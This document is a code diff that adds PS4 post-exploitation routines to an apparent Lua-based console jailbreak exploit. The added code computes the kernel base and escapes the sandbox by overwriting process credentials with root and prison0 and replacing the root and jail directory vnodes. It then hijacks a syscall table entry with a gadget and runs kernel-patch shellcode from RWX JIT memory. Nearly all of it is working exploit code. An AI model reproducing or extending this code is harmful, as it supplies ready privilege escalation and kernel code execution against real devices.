@@ -73,6 +73,8 @@ syscall.resolve({
     aio_multi_poll = 0x298,
     aio_multi_cancel = 0x29a,
     aio_submit_cmd = 0x29d,
+    
+    kexec = 0x295,
 })
 
 
@@ -1633,8 +1635,163 @@ end
 
 
 function post_exploitation_ps4()
-    printf("ps4 is not yet supported for jailbreaking")
-    return
+
+    -- if we havent found evf string offset, assume we havent found every kernel offsets yet for this fw
+    if not kernel_offset.SYSENT_661_OFFSET then
+        printf("fw not yet supported for jailbreaking")
+        return
+    end
+    
+    local evf_ptr = kernel.addr.inside_kdata
+    local evf_string = kernel.read_null_terminated_string(evf_ptr)
+    printf("evf string @ %s = %s", hex(evf_ptr), evf_string)
+    
+    -- Calculate KBASE from EVF using table offsets
+    -- credit: @egycnq
+    local function calculate_kbase(leaked_evf_ptr)
+        local evf_offset = kernel_offset.EVF_OFFSET
+        kernel.addr.data_base = leaked_evf_ptr - evf_offset
+    end
+    
+    -- ELF validation
+    -- credit: @egycnq
+    local function verify_elf_header()
+        local b0 = kernel.read_byte(kernel.addr.data_base):tonumber()
+        local b1 = kernel.read_byte(kernel.addr.data_base + 1):tonumber()
+        local b2 = kernel.read_byte(kernel.addr.data_base + 2):tonumber()
+        local b3 = kernel.read_byte(kernel.addr.data_base + 3):tonumber()
+    
+        printf("ELF header bytes at %s:", hex(kernel.addr.data_base))
+        printf("  [0] = 0x%02X", b0)
+        printf("  [1] = 0x%02X", b1)
+        printf("  [2] = 0x%02X", b2)
+        printf("  [3] = 0x%02X", b3)
+    
+        if b0 == 0x7F and b1 == 0x45 and b2 == 0x4C and b3 == 0x46 then
+            print("ELF header verified KBASE is valid")
+        else
+            print("ELF header mismatch check base address")
+        end
+    end
+    
+    -- Sandbox escape
+    -- credit: @egycnq
+    local function escape_sandbox(curproc)
+        local PRISON0   = kernel.addr.data_base + kernel_offset.PRISON0
+        local ROOTVNODE = kernel.addr.data_base + kernel_offset.ROOTVNODE
+    
+        local OFFSET_P_UCRED = 0x40
+    
+        local proc_fd = kernel.read_qword(curproc + kernel_offset.PROC_FD)
+        local ucred = kernel.read_qword(curproc + OFFSET_P_UCRED)
+        
+        kernel.write_dword(ucred + 0x04, 0) -- cr_uid
+        kernel.write_dword(ucred + 0x08, 0) -- cr_ruid
+        kernel.write_dword(ucred + 0x0C, 0) -- cr_svuid
+        kernel.write_dword(ucred + 0x10, 1) -- cr_ngroups
+        kernel.write_dword(ucred + 0x14, 0) -- cr_rgid
+    
+        local prison0 = kernel.read_qword(PRISON0)
+        kernel.write_qword(ucred + 0x30, prison0)
+
+        -- add JIT privileges 
+        kernel.write_qword(ucred + 0x60, -1)
+        kernel.write_qword(ucred + 0x68, -1)
+    
+        local rootvnode = kernel.read_qword(ROOTVNODE)
+        kernel.write_qword(proc_fd + 0x10, rootvnode) -- fd_rdir
+        kernel.write_qword(proc_fd + 0x18, rootvnode) -- fd_jdir
+    
+        print("Sandbox escape complete ... root FS access and jail broken")
+    end
+
+    local function apply_kernel_patches_ps4()
+        -- get kpatches shellcode
+        local bin_data = get_kernel_patches_shellcode()
+        if #bin_data == 0 then
+            print("Skipping kernel patches due to missing kernel patches shellcode.")
+            return
+        end
+        
+        local bin_data_addr = lua.resolve_value(bin_data)
+        printf("File read to address: 0x%x, %d bytes", bin_data_addr:tonumber(), #bin_data)
+
+        local mapping_addr = uint64(0x920100000)
+        local shadow_mapping_addr = uint64(0x926100000)
+        
+        local sysent_661_addr = kernel.addr.data_base + kernel_offset.SYSENT_661_OFFSET
+        local sy_narg = kernel.read_dword(sysent_661_addr):tonumber()
+        local sy_call = kernel.read_qword(sysent_661_addr + 8):tonumber()
+        local sy_thrcnt = kernel.read_dword(sysent_661_addr + 0x2c):tonumber()
+
+        kernel.write_dword(sysent_661_addr, 2)
+        kernel.write_qword(sysent_661_addr + 8, kernel.addr.data_base + kernel_offset.JMP_RSI_GADGET)
+        kernel.write_dword(sysent_661_addr + 0x2c, 1)
+        
+        syscall.resolve({
+            munmap = 0x49,
+            jitshm_create = 0x215,
+            jitshm_alias = 0x216,
+        })
+        
+        local PROT_RW = bit32.bor(PROT_READ, PROT_WRITE)
+        local PROT_RWX = bit32.bor(PROT_READ, PROT_WRITE, PROT_EXECUTE)
+        
+        local aligned_memsz = 0x10000
+        
+        -- create shm with exec permission
+        local exec_handle = syscall.jitshm_create(0, aligned_memsz, PROT_RWX)
+
+        -- create shm alias with write permission
+        local write_handle = syscall.jitshm_alias(exec_handle, PROT_RW)
+
+        -- map shadow mapping and write into it
+        syscall.mmap(shadow_mapping_addr, aligned_memsz, PROT_RW, 0x11, write_handle, 0)
+        memory.memcpy(shadow_mapping_addr, bin_data_addr:tonumber(), #bin_data)
+
+        -- map executable segment
+        syscall.mmap(mapping_addr, aligned_memsz, PROT_RWX, 0x11, exec_handle, 0)
+        printf("First bytes: 0x%x", memory.read_dword(mapping_addr):tonumber())
+        
+        syscall.kexec(mapping_addr)
+        
+        print("After kexec")
+        
+        kernel.write_dword(sysent_661_addr, sy_narg)
+        kernel.write_qword(sysent_661_addr + 8, sy_call)
+        kernel.write_dword(sysent_661_addr + 0x2c, sy_thrcnt)
+        
+        syscall.close(write_handle)
+        
+        kernel.is_ps4_kpatches_applied = true
+    end
+    
+    local function should_apply_kernel_patches()
+        local success, err = pcall(require, "kernel_patches_ps4")
+
+        if not success then
+            if string.find(err, "module .* not found") then
+                print("\nWarning! Skipping kernel patches due to missing file in savedata: 'kernel_patches_ps4.lua'.\nPlease update savedata from latest.\n")
+            else
+                print(err)
+            end
+            return false
+        end
+        return true
+    end
+    
+    -- Run post-exploit logic
+    kernel.is_ps4_kpatches_applied = false
+    local proc = kernel.addr.curproc
+    calculate_kbase(evf_ptr)
+    printf("Kernel Base Candidate: %s", hex(kernel.addr.data_base))
+    verify_elf_header()
+    local apply_kpatches = should_apply_kernel_patches()
+    escape_sandbox(proc)
+    
+    if apply_kpatches then
+        apply_kernel_patches_ps4()
+    end
 end
 
 
